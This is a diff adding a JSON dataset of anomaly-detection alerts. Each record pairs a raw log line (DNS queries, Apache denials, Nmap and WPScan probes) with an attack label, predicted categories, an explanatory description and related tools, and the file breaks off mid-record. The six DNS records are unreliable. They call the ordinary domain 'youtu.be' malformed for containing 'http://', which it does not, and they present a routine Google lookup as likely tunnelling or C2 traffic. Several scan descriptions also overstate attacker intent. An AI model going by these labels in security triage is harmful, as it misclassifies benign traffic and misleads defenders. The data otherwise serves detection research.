@@ -1,0 +1,1151 @@
+[
+  {
+    "predicted_attack_type": [
+      "Command and Control",
+      "Exfiltration"
+    ],
+    "attack_type": "dnsteal",
+    "description": "High entropy in DNS domain 'youtu.be'. This is a highly unusual and malformed DNS query, as 'http://' should not be part of a domain name. Such a query is a strong indicator of potential malware activity attempting to communicate with a command and control (C2) server or exfiltrate data through DNS tunneling. The high entropy further suggests obfuscation or randomness in the communication.",
+    "tools": [
+      "Wireshark",
+      "dnscat2",
+      "CoreDNS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 30, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in DNS domain.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_dns_domain\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/query/domain\", \"/model/type/reply/domain\", \"/model/type/forwarded/domain\"], \"AffectedLogAtomValues\": [\"youtu.be\"], \"CriticalValue\": 0.014938108374387008, \"ProbabilityThreshold\": 0.015}, \"LogData\": {\"RawLogData\": [\"Jan 17 09:26:33 dnsmasq[14460]: query[A] youtu.be from 192.168.128.4\"], \"Timestamps\": [1642411593], \"DetectionTimestamp\": [1642411593], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/dnsmasq.log\"]}, \"AMiner\": {\"ID\": \"192.168.255.254\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Command and Control",
+      "Exfiltration"
+    ],
+    "attack_type": "dnsteal",
+    "description": "Another instance of high entropy in the malformed DNS domain 'youtu.be', this time being forwarded to 8.8.8.8. The repeated attempts to resolve this clearly invalid domain name signify persistent malicious activity, likely from an infected host trying to establish C2 communication or exfiltrate data using DNS as a covert channel.",
+    "tools": [
+      "Wireshark",
+      "dnscat2",
+      "CoreDNS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 30, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in DNS domain.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_dns_domain\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/query/domain\", \"/model/type/reply/domain\", \"/model/type/forwarded/domain\"], \"AffectedLogAtomValues\": [\"youtu.be\"], \"CriticalValue\": 0.014938108374387008, \"ProbabilityThreshold\": 0.015}, \"LogData\": {\"RawLogData\": [\"Jan 17 09:26:33 dnsmasq[14460]: forwarded youtu.be to 8.8.8.8\"], \"Timestamps\": [1642411593], \"DetectionTimestamp\": [1642411593], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/dnsmasq.log\"]}, \"AMiner\": {\"ID\": \"192.168.255.254\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Command and Control",
+      "Exfiltration"
+    ],
+    "attack_type": "dnsteal",
+    "description": "High entropy detected in the malformed DNS domain 'youtu.be' originating from a different internal IP (172.17.130.196). This suggests that multiple internal hosts might be infected with the same malware or that the malware is spreading within the network.",
+    "tools": [
+      "Wireshark",
+      "dnscat2",
+      "CoreDNS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 30, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in DNS domain.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_dns_domain\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/query/domain\", \"/model/type/reply/domain\", \"/model/type/forwarded/domain\"], \"AffectedLogAtomValues\": [\"youtu.be\"], \"CriticalValue\": 0.014938108374387008, \"ProbabilityThreshold\": 0.015}, \"LogData\": {\"RawLogData\": [\"Jan 17 09:26:33 dnsmasq[14522]: query[A] youtu.be from 172.17.130.196\"], \"Timestamps\": [1642411593], \"DetectionTimestamp\": [1642411593], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/dnsmasq.log\"]}, \"AMiner\": {\"ID\": \"10.35.32.1\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Command and Control",
+      "Exfiltration"
+    ],
+    "attack_type": "dnsteal",
+    "description": "The malformed DNS domain 'youtu.be' is being forwarded to 192.168.255.254. The consistent appearance of this highly suspicious domain in various DNS log entries strongly indicates ongoing malicious activity, likely DNS tunneling for C2 or data exfiltration.",
+    "tools": [
+      "Wireshark",
+      "dnscat2",
+      "CoreDNS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 30, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in DNS domain.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_dns_domain\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/query/domain\", \"/model/type/reply/domain\", \"/model/type/forwarded/domain\"], \"AffectedLogAtomValues\": [\"youtu.be\"], \"CriticalValue\": 0.014938108374387008, \"ProbabilityThreshold\": 0.015}, \"LogData\": {\"RawLogData\": [\"Jan 17 09:26:33 dnsmasq[14522]: forwarded youtu.be to 192.168.255.254\"], \"Timestamps\": [1642411593], \"DetectionTimestamp\": [1642411593], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/dnsmasq.log\"]}, \"AMiner\": {\"ID\": \"10.35.32.1\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Command and Control",
+      "Exfiltration"
+    ],
+    "attack_type": "dnsteal",
+    "description": "The malformed DNS domain 'youtu.be' is receiving a reply (172.217.20.14). A successful DNS resolution for such an anomalous domain is a critical indicator of active command and control communication or data exfiltration. The IP '172.217.20.14' belongs to Google, which can be used for legitimate content delivery, but in this context with the malformed domain, it could be a staged C2 server or a legitimate service being abused by malware.",
+    "tools": [
+      "Wireshark",
+      "dnscat2",
+      "CoreDNS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 30, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in DNS domain.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_dns_domain\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/query/domain\", \"/model/type/reply/domain\", \"/model/type/forwarded/domain\"], \"AffectedLogAtomValues\": [\"youtu.be\"], \"CriticalValue\": 0.014938108374387008, \"ProbabilityThreshold\": 0.015}, \"LogData\": {\"RawLogData\": [\"Jan 17 09:26:34 dnsmasq[14460]: reply youtu.be is 172.217.20.14\"], \"Timestamps\": [1642411594], \"DetectionTimestamp\": [1642411594], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/dnsmasq.log\"]}, \"AMiner\": {\"ID\": \"192.168.255.254\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Command and Control",
+      "Exfiltration"
+    ],
+    "attack_type": "dnsteal",
+    "description": "Another instance of the malformed DNS domain 'youtu.be' receiving a reply. The repeated successful resolution of this highly suspicious domain, along with its malformed nature and high entropy, makes this a high-confidence indicator of active malware using DNS for covert communication.",
+    "tools": [
+      "Wireshark",
+      "dnscat2",
+      "CoreDNS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 30, \"AnalysisComponentType\": \"EntropyDetector\", \"AnalysisComponentName\": \"AMiner: High entropy in DNS domain.\", \"Message\": \"Value entropy anomaly detected\", \"PersistenceFileName\": \"entropy_dns_domain\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/query/domain\", \"/model/type/reply/domain\", \"/model/type/forwarded/domain\"], \"AffectedLogAtomValues\": [\"youtu.be\"], \"CriticalValue\": 0.014938108374387008, \"ProbabilityThreshold\": 0.015}, \"LogData\": {\"RawLogData\": [\"Jan 17 09:26:34 dnsmasq[14522]: reply youtu.be is 172.217.20.14\"], \"Timestamps\": [1642411594], \"DetectionTimestamp\": [1642411594], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/dnsmasq.log\"]}, \"AMiner\": {\"ID\": \"10.35.32.1\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Web Application Attack",
+      "Reconnaissance"
+    ],
+    "attack_type": "servicescans",
+    "description": "New event type: 'client denied by server configuration' for client 192.168.130.77 accessing '/var/www/html/' in Apache error logs. This indicates an attempt to access a forbidden directory. Given the previous mail-related events, this could be an attacker moving from mail service reconnaissance to web server probing, trying to find exposed directories or misconfigurations.",
+    "tools": [
+      "Nikto",
+      "OWASP ZAP",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:17:27.713538 2022] [authz_core:error] [pid 25459] [client 192.168.130.77:35080] AH01630: client denied by server configuration: /var/www/html/\"], \"Timestamps\": [1642508247.71], \"DetectionTimestamp\": [1642508247.71], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-error-error.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Web Application Attack",
+      "Reconnaissance"
+    ],
+    "attack_type": "servicescans",
+    "description": "Another instance of 'client denied by server configuration' for client 172.17.130.196 accessing '/var/www/html/'. The repeated denial of access from different IPs suggests a coordinated scanning effort or multiple compromised internal hosts attempting to access sensitive web server directories.",
+    "tools": [
+      "Nikto",
+      "OWASP ZAP",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:17:27.714052 2022] [authz_core:error] [pid 25371] [client 172.17.130.196:44746] AH01630: client denied by server configuration: /var/www/html/\"], \"Timestamps\": [1642508247.71], \"DetectionTimestamp\": [1642508247.71], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-error-error.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "New event type: 'TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.' in Exim mail logs. This error indicates that the client (192.168.130.77) is not performing a proper TLS handshake, possibly due to an attempt to connect with a non-TLS client to a TLS-only port, or a misconfigured scanning tool. Combined with the previous 'no host name found' and 'client denied' errors, this points to an attacker broadly scanning for services and misconfigurations.",
+    "tools": [
+      "OpenSSL",
+      "Nmap"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/start/remainder\"]}, \"LogData\": {\"RawLogData\": [\"2022-01-18 12:17:28 TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.\"], \"Timestamps\": [1642508248], \"DetectionTimestamp\": [1642508248], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/exim4/mainlog\"]}, \"AMiner\": {\"ID\": \"192.168.128.170\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "New status code '403' detected in Apache Access log for a request to '/nmaplowercheck1642508249' from 192.168.130.77, with User-Agent 'Nmap Scripting Engine'. This is a clear indicator of active reconnaissance using Nmap, specifically the Nmap Scripting Engine (NSE), to identify web services and potential vulnerabilities. The 403 Forbidden status indicates the server is preventing access, but the scan is ongoing.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"192.168.130.77 - - [18/Jan/2022:12:17:29 +0000] \\\"GET /nmaplowercheck1642508249 HTTP/1.1\\\" 403 363 \\\"-\\\" \\\"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\\\"\"], \"Timestamps\": [1642508249], \"DetectionTimestamp\": [1642508249], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-access-access.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "New status code '403' detected in Apache Access log for a POST request to '/sdk' from 172.17.130.196, also with User-Agent 'Nmap Scripting Engine'. This reinforces the active Nmap scanning activity, likely attempting to discover web service endpoints or vulnerabilities in an SDK, indicating an attacker specifically targeting API or development-related directories.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:29 +0000] \\\"POST /sdk HTTP/1.1\\\" 403 3260 \\\"-\\\" \\\"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\\\"\"], \"Timestamps\": [1642508249], \"DetectionTimestamp\": [1642508249], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-access-access.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "New status code '403' detected in Apache Access log for a GET request to '/' from 172.17.130.196. While a simple GET to the root, combined with other Nmap-related alerts, this indicates that the Nmap scan is also checking for basic directory access. The 403 response confirms that the server is configured to deny general access to the root, which is a good security practice but also a signal to the attacker that the server is active.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:29 +0000] \\\"GET / HTTP/1.0\\\" 403 363 \\\"-\\\" \\\"-\\\"\"], \"Timestamps\": [1642508249], \"DetectionTimestamp\": [1642508249], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-access-access.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "New status code '403' for a POST request to '/sdk' from 192.168.130.77, identified by 'Nmap Scripting Engine'. This is a clear indicator of Nmap being used for vulnerability scanning, specifically targeting potential API endpoints or SDKs. The 403 response confirms that the server is denying access, but the scan is actively probing.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"192.168.130.77 - - [18/Jan/2022:12:17:29 +0000] \\\"POST /sdk HTTP/1.1\\\" 403 3260 \\\"-\\\" \\\"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\\\"\"], \"Timestamps\": [1642508249], \"DetectionTimestamp\": [1642508249], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-access-access.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "Another instance of a new status code '403' for a POST request to '/sdk' from 172.17.130.196, again via 'Nmap Scripting Engine'. The repetition across different source IPs or targets highlights a consistent, automated scanning effort. This indicates an attacker is systematically trying to discover and exploit weaknesses related to development frameworks or SDKs.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:29 +0000] \\\"POST /sdk HTTP/1.1\\\" 403 363 \\\"-\\\" \\\"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\\\"\"], \"Timestamps\": [1642508249], \"DetectionTimestamp\": [1642508249], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-access-access.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "New event type: 'client denied by server configuration: /var/www/html/HNAP1' for client 192.168.130.77. HNAP (Home Network Administration Protocol) is a known protocol that has been exploited in routers and other network devices. Attempts to access '/HNAP1' often indicate vulnerability scanning for devices susceptible to HNAP-related exploits.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:17:29.873113 2022] [authz_core:error] [pid 25460] [client 192.168.130.77:43654] AH01630: client denied by server configuration: /var/www/html/HNAP1\"], \"Timestamps\": [1642508249.87], \"DetectionTimestamp\": [1642508249.87], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-error-error.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "Another instance of 'client denied by server configuration: /var/www/html/HNAP1' from 192.168.130.77. The repeated targeting of the HNAP1 path confirms ongoing vulnerability scanning specifically for this protocol, which is a strong indicator of malicious intent.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:17:29.873517 2022] [authz_core:error] [pid 25459] [client 192.168.130.77:35160] AH01630: client denied by server configuration: /var/www/html/HNAP1\"], \"Timestamps\": [1642508249.87], \"DetectionTimestamp\": [1642508249.87], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-error-error.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "Another instance of 'client denied by server configuration: /var/www/html/HNAP1' from 172.17.130.196. The fact that multiple clients are attempting to access this path, or that an attacker is using different source IPs, points to a broader or more sophisticated scanning operation targeting HNAP vulnerabilities.",
+    "tools": [
+      "Nmap",
+      "Metasploit"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:17:29.873636 2022] [authz_core:error] [pid 25454] [client 172.17.130.196:44830] AH01630: client denied by server configuration: /var/www/html/HNAP1\"], \"Timestamps\": [1642508249.87], \"DetectionTimestamp\": [1642508249.87], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-error-error.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "New event type: 'client denied by server configuration: /var/www/html/' for client 172.17.130.196. This indicates a general attempt to access the web root, likely as part of a broad scan to identify accessible directories or web applications. While a denial, it confirms active probing.",
+    "tools": [
+      "Nikto",
+      "OWASP ZAP",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:17:29.873799 2022] [authz_core:error] [pid 25202] [client 172.17.130.196:44820] AH01630: client denied by server configuration: /var/www/html/\"], \"Timestamps\": [1642508249.87], \"DetectionTimestamp\": [1642508249.87], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-error-error.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Network Scanning"
+    ],
+    "attack_type": "servicescans",
+    "description": "Another instance of 'client denied by server configuration: /var/www/html/' for client 192.168.130.77. Consistent attempts to access forbidden web directories from different source IPs (or the same IP over time) suggests persistent reconnaissance, where an attacker is mapping the web server's structure and access controls.",
+    "tools": [
+      "Nikto",
+      "OWASP ZAP",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:17:29.873915 2022] [authz_core:error] [pid 25292] [client 192.168.130.77:35156] AH01630: client denied by server configuration: /var/www/html/\"], \"Timestamps\": [1642508249.87], \"DetectionTimestamp\": [1642508249.87], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/proxy-error-error.log\"]}, \"AMiner\": {\"ID\": \"172.17.130.37\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "New status code '403' for a GET request to '/wp-content/plugins/akismet/' from 172.17.130.196, with User-Agent 'WPScan'. This is a definitive indicator of a WordPress vulnerability scan. WPScan is a dedicated tool for identifying vulnerabilities in WordPress installations, and a 403 response indicates that the server is denying access to this plugin directory, but the scan is actively enumerating plugins.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"GET /wp-content/plugins/akismet/ HTTP/1.1\\\" 403 3362 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "New request method 'HEAD' (value '3') for '/wp-content/plugins/analytics-for-wp/' from 172.17.130.196, with User-Agent 'WPScan'. The 'HEAD' method is often used in reconnaissance to check for the existence of resources without downloading their content. This, combined with the WPScan User-Agent, confirms an active vulnerability scan targeting WordPress plugins. The 404 response means the plugin was not found, but the scan continues.",
+    "tools": [
+      "WPScan"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 5, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New request method in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_request_method\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/method\"], \"AffectedLogAtomValues\": [\"3\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:17:58 +0000] \\\"HEAD /wp-content/plugins/analytics-for-wp/ HTTP/1.1\\\" 404 146 \\\"https://intranet.price.fox.org\\\" \\\"WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)\\\"\"], \"Timestamps\": [1642508278], \"DetectionTimestamp\": [1642508278], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Reconnaissance",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "wpscan",
+    "description": "Another instance of a new request method 'HEAD' for '/wp-content/plugins/animate-it/' from 172.17.130.196, with User-Agent 'WPScan'. This is consistent with a comprehensive WordPress plugin enumeration by WPScan. The attacker is methodically checking for the presence of various plugins to identify potential vulnerabilities.",
+    "tools": [
+      "WPScan"
+    ],
